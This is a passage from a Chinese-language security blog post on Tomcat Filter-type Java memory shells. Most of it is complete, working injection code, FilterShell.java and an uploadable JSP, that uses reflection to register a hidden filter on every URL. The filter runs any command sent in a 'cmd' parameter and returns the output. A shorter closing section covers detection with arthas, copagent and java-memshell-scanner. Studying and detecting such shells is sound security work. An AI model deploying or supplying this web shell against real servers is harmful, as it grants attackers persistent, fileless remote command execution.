+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//反射获取 FilterDef，设置 filter 名等参数后，调用 addFilterDef 将 FilterDef 添加  </span><br>Class&lt;?&gt; FilterDef = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);  <br><span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructors</span> <span class="hljs-operator">=</span> FilterDef.getDeclaredConstructor();  <br><span class="hljs-type">FilterDef</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (FilterDef) declaredConstructors.newInstance();  <br>o.setFilter(filter);  <br>o.setFilterName(FilterName);  <br>o.setFilterClass(filter.getClass().getName());  <br>standardContext.addFilterDef(o);  <br><span class="hljs-comment">//反射获取 FilterMap 并且设置拦截路径，并调用 addFilterMapBefore 将 FilterMap 添加进去  </span><br>Class&lt;?&gt; FilterMap = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);  <br>Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();  <br>org.apache.tomcat.util.descriptor.web.<span class="hljs-type">FilterMap</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> (FilterMap)declaredConstructor.newInstance();  <br>  <br>o1.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);  <br>o1.setFilterName(FilterName);  <br>o1.setDispatcher(DispatcherType.REQUEST.name());  <br>standardContext.addFilterMapBefore(o1);<br></code></pre></td></tr></table></figure>
+
+<p>最终将它们都添加到 filterConfig 里面，再放到 web.xml 里面</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; ApplicationFilterConfig = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);  <br>Constructor&lt;?&gt; declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);  <br>declaredConstructor1.setAccessible(<span class="hljs-literal">true</span>);  <br><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);  <br>filterConfigs.put(FilterName,filterConfig);  <br>response.getWriter().write(<span class="hljs-string">&quot;Success&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>完整的 EXP 如下所示</p>
+</blockquote>
+<p><strong>FilterShell.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.catalina.Context;  <br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;  <br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;  <br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;  <br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;  <br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;  <br>  <br><span class="hljs-keyword">import</span> javax.servlet.*;  <br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;  <br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;  <br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;  <br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.io.InputStream;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br>  <br><span class="hljs-keyword">import</span> java.util.Map;  <br><span class="hljs-keyword">import</span> java.util.Scanner;  <br>  <br><span class="hljs-meta">@WebServlet(&quot;/demoServlet&quot;)</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterShell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;  <br>  <br>  <br><span class="hljs-comment">//        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();  </span><br><span class="hljs-comment">//        org.apache.catalina.webresources.StandardRoot standardroot = (org.apache.catalina.webresources.StandardRoot) webappClassLoaderBase.getResources();  </span><br><span class="hljs-comment">//        org.apache.catalina.core.StandardContext standardContext = (StandardContext) standardroot.getContext();  </span><br><span class="hljs-comment">//该获取StandardContext测试报错  </span><br> <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br> Map filterConfigs;  <br> <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-comment">//这里是反射获取ApplicationContext的context，也就是standardContext  </span><br> <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);  <br> appctx.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);  <br> stdctx.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);  <br>  <br>  <br>  <br> <span class="hljs-type">String</span> <span class="hljs-variable">FilterName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cmd_Filter&quot;</span>;  <br> Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);  <br> Configs.setAccessible(<span class="hljs-literal">true</span>);  <br> filterConfigs = (Map) Configs.get(standardContext);  <br>  <br> <span class="hljs-keyword">if</span> (filterConfigs.get(FilterName) == <span class="hljs-literal">null</span>)&#123;  <br>                <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;  <br>  <br>                    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;  <br>  <br>                    &#125;  <br>  <br>                    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;  <br>                        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;  <br> <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>)&#123;  <br>  <br>                            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();  <br><span class="hljs-comment">//  </span><br> <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);  <br> <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;  <br> servletResponse.getWriter().write(output);  <br>  <br> <span class="hljs-keyword">return</span>; &#125;  <br>                        filterChain.doFilter(servletRequest,servletResponse);  <br> &#125;  <br>  <br>                    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;  <br>  <br>                    &#125;  <br>                &#125;;  <br> <span class="hljs-comment">//反射获取FilterDef，设置filter名等参数后，调用addFilterDef将FilterDef添加  </span><br> Class&lt;?&gt; FilterDef = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructors</span> <span class="hljs-operator">=</span> FilterDef.getDeclaredConstructor();  <br> <span class="hljs-type">FilterDef</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (FilterDef)declaredConstructors.newInstance();  <br> o.setFilter(filter);  <br> o.setFilterName(FilterName);  <br> o.setFilterClass(filter.getClass().getName());  <br> standardContext.addFilterDef(o);  <br> <span class="hljs-comment">//反射获取FilterMap并且设置拦截路径，并调用addFilterMapBefore将FilterMap添加进去  </span><br> Class&lt;?&gt; FilterMap = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);  <br> Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();  <br> org.apache.tomcat.util.descriptor.web.<span class="hljs-type">FilterMap</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> (FilterMap)declaredConstructor.newInstance();  <br>  <br> o1.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);  <br> o1.setFilterName(FilterName);  <br> o1.setDispatcher(DispatcherType.REQUEST.name());  <br> standardContext.addFilterMapBefore(o1);  <br>  <br> <span class="hljs-comment">//反射获取ApplicationFilterConfig，构造方法将 FilterDef传入后获取filterConfig后，将设置好的filterConfig添加进去  </span><br> Class&lt;?&gt; ApplicationFilterConfig = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);  <br> Constructor&lt;?&gt; declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);  <br> declaredConstructor1.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);  <br> filterConfigs.put(FilterName,filterConfig);  <br> response.getWriter().write(<span class="hljs-string">&quot;Success&quot;</span>);  <br>  <br>  <br> &#125;  <br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  <br>            e.printStackTrace();  <br> &#125;  <br>  <br>  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;  <br>        <span class="hljs-built_in">this</span>.doPost(request, response);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p>如果文件上传的话应该是上传一个 .jsp 文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%--<br>  User: Drunkbaby<br>  Date: <span class="hljs-number">2022</span>/<span class="hljs-number">8</span>/<span class="hljs-number">27</span><br>  Time: 上午<span class="hljs-number">10</span>:<span class="hljs-number">31</span><br>--%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br><br>&lt;%<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Drunkbaby&quot;</span>;<br>    <span class="hljs-comment">// 获取上下文</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>    <span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>                <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>                <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                        isLinux = <span class="hljs-literal">false</span>;<br>                    &#125;<br>                    String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>( in ).useDelimiter(<span class="hljs-string">&quot;\\a&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                    servletResponse.getWriter().write(output);<br>                    servletResponse.getWriter().flush();<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                filterChain.doFilter(servletRequest, servletResponse);<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>            &#125;<br><br>        &#125;;<br><br>        <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>        filterDef.setFilter(filter);<br>        filterDef.setFilterName(name);<br>        filterDef.setFilterClass(filter.getClass().getName());<br>        standardContext.addFilterDef(filterDef);<br><br>        <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>        filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>        filterMap.setFilterName(name);<br>        filterMap.setDispatcher(DispatcherType.REQUEST.name());<br><br>        standardContext.addFilterMapBefore(filterMap);<br><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br><br>        filterConfigs.put(name, filterConfig);<br>        out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br>    &#125;<br>%&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;filter&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    Hello Filter<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>到时候上传这个 jsp 马即可</p>
+<h1 id="排查java内存马"><a href="#排查java内存马" class="headerlink" title="排查java内存马"></a>排查java内存马</h1><p>基本全部出自：<a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1529">http://wjlshare.com/archives/1529</a></p>
+<h3 id="arthas"><a href="#arthas" class="headerlink" title="arthas"></a>arthas</h3><p>项目链接：<a target="_blank" rel="noopener" href="https://github.com/alibaba/arthas">https://github.com/alibaba/arthas</a></p>
+<p>我们可以利用该项目来检测我们的内存马</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>arthas-<span class="hljs-keyword">boot.jar </span>--telnet-port <span class="hljs-number">9998</span> --http-port -<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>这里也可以直接 <code>java -jar arthas-boot.jar</code></p>
+<p>这里选择我们 Tomcat 的进程</p>
+<p><img src="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/TomcatProcess.png" srcset="/img/loading.gif" lazyload></p>
+<p>输入 1 之后会进入如下进程</p>
+<p><img src="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/TomcatProcess.png" srcset="/img/loading.gif" lazyload></p>
+<p>利用 <code>sc *.Filter</code> 进行模糊搜索，会列出所有调用了 Filter 的类？</p>
+<p><img src="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/SCAllFilter.png" srcset="/img/loading.gif" lazyload></p>
+<p>利用<code>jad --source-only org.apache.jsp.evil_jsp</code> 直接将 Class 进行反编译，这样就完成了防御。</p>
+<p><img src="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/JarClass.png" srcset="/img/loading.gif" lazyload></p>
+<p>同时也可以进行监控 ，当我们访问 url 就会输出监控结果</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">watch org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.ApplicationFilterFactory</span> createFilterChain <span class="hljs-string">&#x27;returnObj.filters.&#123;?#this!=null&#125;.&#123;filterClass&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="copagent"><a href="#copagent" class="headerlink" title="copagent"></a>copagent</h3><p>项目链接：<a target="_blank" rel="noopener" href="https://github.com/LandGrey/copagent">https://github.com/LandGrey/copagent</a></p>
+<p>也是一款可以检测内存马的工具</p>
+<h3 id="java-memshell-scanner"><a href="#java-memshell-scanner" class="headerlink" title="java-memshell-scanner"></a>java-memshell-scanner</h3><p>项目链接：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/java-memshell-scanner">https://github.com/c0ny1/java-memshell-scanner</a></p>
+<p>c0ny1 师傅写的检测内存马的工具，能够检测并且进行删除，是一个非常方便的工具，工具界面如图</p>
+<p><img src="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/MemshellScanner.png" srcset="/img/loading.gif" lazyload></p>
+<p>该工具是由 jsp 实现的，我们这里主要来学习一下 c0ny1 师傅 删除内存马的逻辑</p>
+<p>检测是通过遍历 filterMaps 中的所有 filterMap 然后显示出来，让我们自己认为判断，所以这里提供了 dumpclass</p>
